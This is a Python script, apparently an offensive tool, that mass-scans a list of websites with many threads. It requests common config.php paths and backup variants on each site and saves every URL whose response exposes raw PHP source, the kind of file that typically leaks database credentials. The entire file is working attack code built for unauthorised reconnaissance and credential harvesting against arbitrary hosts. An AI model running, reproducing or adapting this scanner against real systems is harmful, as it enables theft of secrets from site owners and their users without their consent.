import requests,time,os,sys,re,socket,paramiko
from termcolor import colored
from bs4 import BeautifulSoup
from time import time as timer
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from threading import Thread
try:
    from Queue import Queue
except:
    from queue import Queue
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import init
init()

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception as e: print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()
class warna():
	"""docstring for warna"""
	def red(self,str):
		return colored(str, "red")
	def blue(self,str):
		return colored(str, "blue")
	def green(self,str):
		return colored(str, "green")
	def yellow(self,str):
		return colored(str, "yellow")
		
class _exploit():


		
	def save(self, sites,names):
		s = open(names, "a+")
		s.write(sites+"\n")
		return s
	def __init__(self):
		self.clr = warna()
	def starts(self,ip):
		
			
		regex = "<\?php"

		config = ['/config.php','/config/config.php','/Config.txt','/config.php7','/config.php.ini','/config.php/./','/config/config.php/./','/config.php.sample','/config/config.php.sample','/config.old','/config/config.old','/config.php.save','/config.php/config.php.save']
		#url = 'http://127.0.0.1'
		for i in config:
			request = requests.get(ip+"/"+i,verify=False)
			if request.status_code == 200:
				regg =re.findall(regex,request.text)
				try :
		
					if regg[0] != None :
						print(self.clr.green(("FOUND CONFIG.php ==> "+ip+"/"+i)))
						self.save(ip+i,"out.txt")
				except:
					pass

			elif request.status_code == 404:
				print(self.clr.red("Not Found"))

			elif request.status_code == 403:
				print(self.clr.yellow("Forbidden"))
exploit = _exploit()



def formaturl(ip):
    if not re.match('(?:http|ftp|https)://', ip):
        return ip
    return ip

def main():

	try:
		print('''
╔╔══════════════════════╗╗ 
║║▐█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▌║║ 
║║▐▌░░▒▒░░▒▒░░▒▒░░▒▒░░▐▌║║ 
║║▐▌▒▒░░▒▒░░▒▒░░▒▒░░▒▒▐▌║║ 
║║▐▌▒▒░░▒▒░░▒▒░░▒▒░░▒▒▐▌║║ 
║║▐▌░░▒▒░░▒▒░░▒▒░░▒▒░░▐▌║║ 
║║▐▌▒▒░░▒▒░░▒▒░░▒▒░░▒▒▐▌║║  
║║▐▌░░▒▒░░▒▒░░▒▒░░▒▒░░▐▌║║ 
║║▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▌║║ 
╚╚══════════════════════╝╝ 
██▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄██ 
██▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄██ 
██▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄██ 
██▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██ 
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
''')

		lisnya = input("Your name list -> ")
		trit = int(input("Put Your Thread Number -> "))

		#os.system('cls' if os.name == 'nt' else 'clear')


		try:
			l = []

			Th = ThreadPool(int(trit))

			with open(lisnya, 'r') as ip:

				for x in ip:
					Th.add_task(exploit.starts, formaturl(x.strip()))

			Th.wait_completion()
			
		except IOError as e:
			print("[-] YOUR LIST NOT FOUND !")
			sys.exit()
		
	except Exception as e:
		pass 


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt  as e:
		print("[!] Exit Program....")
		sys.exit()
		pass
